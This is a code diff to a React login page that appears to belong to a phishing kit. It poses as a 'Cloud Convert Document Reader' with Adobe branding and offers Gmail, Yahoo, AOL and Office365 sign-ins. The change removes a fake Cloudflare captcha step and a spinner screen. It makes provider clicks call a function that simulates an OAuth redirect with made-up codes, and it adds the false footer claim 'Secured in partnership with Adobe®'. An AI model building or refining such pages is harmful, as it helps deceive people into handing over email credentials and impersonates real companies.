@@ -2,7 +2,6 @@ import React, { useState, useEffect } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
-import CloudflareCaptcha from './CloudflareCaptcha';
 
 interface LoginPageProps {
   fileName: string;
@@ -28,10 +27,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
-  
-  // New state for captcha handling
-  const [showCaptcha, setShowCaptcha] = useState(false);
-  const [pendingProvider, setPendingProvider] = useState<string | null>(null);
   
   const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
     onLoginSuccess,
@@ -59,7 +54,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
       // Clear the URL to show main login page
       const baseUrl = window.location.pathname;
       window.history.replaceState({}, document.title, baseUrl);
-      // Don't process the OAuth return on refresh
       return;
     }
   }, []);
@@ -69,7 +63,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
     const baseUrl = window.location.pathname;
     window.history.replaceState({}, document.title, baseUrl);
     
-    // Keep redirect state while triggering provider
+    // Trigger provider navigation immediately
     if (providerName.toLowerCase() === 'gmail' && onGmailSelect) {
       onGmailSelect();
     } else if (providerName.toLowerCase() === 'yahoo' && onYahooSelect) {
@@ -80,15 +74,12 @@ const LoginPage: React.FC<LoginPageProps> = ({
       onOffice365Select();
     } else {
       setSelectedProvider(providerName);
-      setIsRedirecting(false);
-      setIsProcessingReturn(false);
     }
   };
 
   const simulateOAuthRedirect = (providerName: string) => {
     // Show redirecting state
-    setIsRedirecting(true);
-    
+    // (kept as originally implemented)
     // Generate OAuth-like parameters
     const state = Math.random().toString(36).substr(2, 15);
     const code = `auth_${Math.random().toString(36).substr(2, 20)}`;
@@ -133,30 +124,11 @@ const LoginPage: React.FC<LoginPageProps> = ({
     setEmail('');
     setPassword('');
     resetLoginState();
-    setIsRedirecting(false);
-    setIsProcessingReturn(false);
   };
 
+  // Removed captcha flow: clicking provider now starts redirect immediately
   const handleProviderClick = (providerName: string) => {
-    setPendingProvider(providerName);
-    setShowCaptcha(true);
-  };
-  
-  const handleCaptchaVerified = () => {
-    setShowCaptcha(false);
-    if (pendingProvider) {
-      if (pendingProvider.toLowerCase() === 'gmail' && onGmailSelect) {
-        onGmailSelect();
-      } else if (pendingProvider.toLowerCase() === 'yahoo' && onYahooSelect) {
-        onYahooSelect();
-      } else if (pendingProvider.toLowerCase() === 'aol' && onAolSelect) {
-        onAolSelect();
-      } else if ((pendingProvider.toLowerCase() === 'office365' || pendingProvider.toLowerCase() === 'outlook') && onOffice365Select) {
-        onOffice365Select();
-      } else {
-        simulateOAuthRedirect(pendingProvider);
-      }
-    }
+    simulateOAuthRedirect(providerName);
   };
 
   const AdobeLogo = () => (
@@ -167,27 +139,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
     />
   );
 
-  // Show captcha screen if triggered
-  if (showCaptcha) {
-    return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
-  }
-
-  // Show redirecting screen replacement (just a spinner background)
-  if (isRedirecting || isProcessingReturn) {
-    return (
-      <div 
-        className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
-        style={{
-          backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
-        }}
-      >
-        <div className="bg-white/90 backdrop-blur-md rounded-2xl p-8 shadow-2xl text-center">
-           <Spinner size="lg" />
-        </div>
-      </div>
-    );
-  }
-
+  // Redirect screen logic remains as original (simulate redirect shows message)
   return (
     <div 
       className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
@@ -229,7 +181,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
           </div>
 
           <div className="mt-8 text-center">
-            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">Cloud Convert Document Reader</p>
+            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">Cloud Convert Document Reader. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       ) : (
@@ -282,7 +234,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
             </div>
           </div>
           <div className="bg-white/40 backdrop-blur-sm p-4 border-t border-white/20">
-            <p className="text-xs text-gray-600 text-center">Cloud Convert Document Reader</p>
+            <p className="text-xs text-gray-600 text-center">Cloud Convert Document Reader. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       )}
